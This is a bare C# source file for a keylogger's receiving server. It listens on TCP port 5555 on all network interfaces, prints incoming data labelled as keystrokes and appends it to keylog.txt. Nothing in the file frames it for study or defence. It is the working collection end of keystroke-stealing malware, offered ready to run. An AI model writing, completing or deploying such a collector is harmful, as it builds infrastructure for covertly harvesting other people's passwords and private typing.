using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

class LoggerServer
{
    static void Main(string[] args)
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 5555);
        listener.Start();
        Console.WriteLine("Server started. Listening for connections...");

        while (true)
        {
            using (TcpClient client = listener.AcceptTcpClient())
            using (NetworkStream stream = client.GetStream())
            {
                Console.WriteLine("Client connected.");

                byte[] buffer = new byte[1024];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string receivedText = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("Received keystrokes: " + receivedText);

                    // Append to a log file
                    File.AppendAllText("keylog.txt", receivedText + Environment.NewLine);
                }
            }
        }
    }
}
